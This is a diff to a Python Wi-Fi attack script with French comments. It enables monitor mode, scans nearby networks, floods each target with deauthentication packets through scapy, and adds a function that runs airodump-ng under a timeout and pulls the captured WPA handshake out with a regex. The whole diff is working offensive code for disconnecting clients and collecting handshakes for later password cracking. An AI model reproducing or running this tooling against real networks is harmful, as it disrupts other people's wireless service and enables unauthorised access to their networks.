@@ -5,7 +5,9 @@ from prettytable import PrettyTable
 import argparse
 import sys
 import subprocess
-
+import shlex
+import time
+from threading import Timer
 """
 TODO
 
@@ -25,7 +27,8 @@ REVERSE = "\033[;7m"
 
 
 packet_sniff_timeout = 10
-deauth_packets = 100
+timeout_airodump = 10
+deauth_packets = 60
 
 
 
@@ -57,7 +60,7 @@ main()
 
 #conf si le user n'a rien mis
 if len(sys.argv) < 2:
-    print("[+] Okay ! by default wlan0 interface !")
+    print(GREEN,"[+] Okay ! by default wlan0 interface !", RESET)
     interface = "wlan0"
     wlanmon = "wlan0"
 
@@ -69,6 +72,7 @@ if len(sys.argv) > 2:
 # mode Monitor
 os.system("airmon-ng check kill  > /dev/null")
 os.system(f"airmon-ng start {interface} > /dev/null") # > /dev/null pour 0 output
+time.sleep(3)
 
 
 # Fonction pour scanner les réseaux WiFi
@@ -109,6 +113,28 @@ networks = scan_wifi_networks()
 # Affichage des réseaux WiFi
 display_wifi_networks(networks)
 
+def handshake_grab(command, timeout):
+    process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+    # Fonction pour tuer le processus si le timeout est atteint
+    def kill_process(p):
+        p.kill()
+
+    # Lancement du timer pour le timeout
+    timer = Timer(timeout, kill_process, [process])
+
+    try:
+        # Démarrage du timer et de l'exécution de la commande
+        timer.start()
+        output, error = process.communicate()
+    finally:
+        # Annulation du timer
+        timer.cancel()
+
+    return output.decode()
+
+
+
 
 #prise d'infos (client pour deauth)
 if bssid_list:
@@ -123,17 +149,31 @@ if bssid_list:
 
             print(BLUE,f"[+] DeAuth for MAC : {mac}",RED)
 
-            command = f"airodump-ng --bssid {mac} --channel {channel} {wlanmon}" # essaye de chopper le handshake
-
             
-            sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1)
+            sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1),RESET# BOOM wifi deauth
 
-            # BOOM wifi deauth
+            command = f"airodump-ng --bssid {mac} --channel {channel} {wlanmon}" # essaye de chopper le handshake
+            output = handshake_grab(command, timeout_airodump)
+            #print(output)
+
+            # Utilisation de la regex pour grep le handshake
+            regex = r'WPA handshake: ([A-F0-9:]+)'
+            match = re.search(regex, output)
+
+            if match:
+                handshake = match.group(0)
+                print(BOLD, GREEN,f'BOOM ! For {mac} the Handshake is : {handshake}', RESET)
+            else:
+                print(RED,"[-] No handshake Found",RESET)
 
         deauth_wifi(mac, interface)
 
+
 else:
-    print("[-] No wifi hotspot found !")
+    print(BOLD, RED,"[-] No wifi hotspot found !\n\n[*] Try again (or re-active your monitor mode) !")
+    sys.exit()
+    
+
 
 
 
